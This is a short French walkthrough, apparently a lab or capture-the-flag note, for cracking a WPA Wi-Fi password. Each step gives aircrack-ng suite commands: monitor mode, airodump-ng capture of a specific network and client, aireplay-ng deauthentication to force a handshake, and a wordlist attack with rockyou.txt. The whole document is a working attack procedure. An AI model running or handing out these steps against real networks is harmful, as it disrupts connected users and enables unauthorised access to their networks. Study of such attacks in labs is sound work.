# 1. Passer en mode moniteur
```bash
sudo airmon-ng check kill
sudo ifconfig wlan0 down
sudo iwconfig wlan0 mode monitor
sudo ifconfig wlan0 up
```

# 2. Trouver le BSSID, le channel, et le client connecté au réseau
```bash
sudo airodump-ng wlan0
```

On obtient par exemple :
```
ESSID : IoT
BSSID : C0:EE:FB:E0:01:E2  
Station (client connecté) : B8:27:EB:E7:39:88  
Channel : 1
```

# 3. Régler le canal
```bash
sudo iwconfig wlan0 channel 1
```

# 4. Lancer airodump-ng pour capturer les paquets
```bash
sudo airodump-ng wlan0 -c 1 --bssid C0:EE:FB:E0:01:E2 -w /tmp/psk --output-format pcap
```
Le résultat est enregistré dans le fichier `/tmp/psk-01.cap` au format pcap.

# 5. Forcer la déconnexion du client
```bash
sudo aireplay-ng --deauth 10 -a C0:EE:FB:E0:01:E2 -c B8:27:EB:E7:39:88 wlan0
```

On force la déconnexion du client connecté au réseau. L'objectif est de le forcer à se reconnecter pour capturer le handshake WPA.

# 6. Vérifier le handshake
```bash
sudo aircrack-ng /tmp/psk-01.cap
```

Ca permet de vérifier si le handshake a bien été capturé.

# 7. Craquer le mot de passe
```bash
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b C0:EE:FB:E0:01:E2 /tmp/psk*.cap
```

On utilise le fichier `rockyou.txt` pour craquer le mot de passe WPA.